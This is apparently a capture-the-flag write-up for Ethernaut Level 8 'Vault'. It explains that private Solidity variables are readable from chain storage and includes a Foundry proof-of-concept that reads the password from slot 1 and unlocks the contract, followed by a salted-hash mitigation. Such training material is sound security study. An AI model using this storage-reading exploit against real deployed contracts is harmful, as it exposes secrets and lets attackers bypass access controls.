# Level 8 - Vault

## Objectives

- unlock the vault to pass the level

## Contract Overview

Access to the `Vault` contract is protected by a password. It is set during contract construction. The password string is saved as bytes32 in the `private` variable `password`. The state of the `Vault` is represented by the boolean flag `locked`. The contract is `locked` by default (`locked` is equal to true) and the goal is to change it to `false`.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Vault_slither.png)

## Finding the weak spots

All the storage data on the blockchain is publicly visible and anyone can obtain it.

The `unlock()` function is taking an input `_password` and comparing it with an already set password in the constructor. We can not see the password hardcoded anywhere but the thing about blockchain is all the storage data is publicly visible and anyone can obtain it. The `private` variables are not meant to store "private" data/passwords.

Private state variables (and functions) are only hidden from other contracts. They are visible in the contracts in which they are defined. Any off-chain component can still query contracts storage and access specific storage slot values.

```solidity
  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
```

## Potential attack scenario (hypothesis)

Attacker can query the secret password from the appropriate storage slot via `vm.load()`.

## Plan of the attack

1. Attacker looks at the order of declaration of state variables in the contracts source code.
2. Attacker determines which storage slot will be occupied by the password.
3. Attacker performs a call to read the password from the storage.
4. Attacker can now make a call to the `unlock()` function passing the password as the argument.
5. The `Vault` contract is unlocked.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/08-Vault.t.sol))

```solidity
 emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Starting the exploit...");
        emit log_string(
            "Attacker reads the password from the storage slot number 1..."
        );

        bytes32 passwordFromStorage = vm.load(
            address(vaultContract),
            bytes32(uint256(1))
        );
        emit log_named_bytes32("Password in bytes32: ", passwordFromStorage);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("Converting password to human-readable form...");
        string memory passwordConverted = string(
            abi.encodePacked(passwordFromStorage)
        );
        emit log_named_string(
            "Password converted to string: ",
            passwordConverted
        );

        //Attacker performs a call to read the password from the storage.
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string(
            "Attacker calls the unlock function with the aquired password..."
        );

        // Attacker can now make a call to the `unlock()` function passing the password as the argument.
        (bool success, ) = address(vaultContract).call(
            abi.encodeWithSignature("unlock(bytes32)", passwordFromStorage)
        );
        require(success, "Transaction failed");

        emit log_string("Vault lock cracked...");

        // Test assertion
        assertEq(vaultContract.locked(), false);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Vault.png)

## Recommendations

- Sensitive information should not be stored on the blockchain in raw form. One way to mitigate the issue would be to store the hash of the password with a `salt` added to it to obfuscate it. Later when a user would like to unlock the `Vault` he would use a function that calculates the hash from the password that he submitted, adds `salt` to it and checks if it matches with the one stored in the storage. This way it would be impossible to just copy the password from storage because to calculate it you need both the `salt` and the password itself.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Solidity by Example](https://solidity-by-example.org/hacks/self-destruct/)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
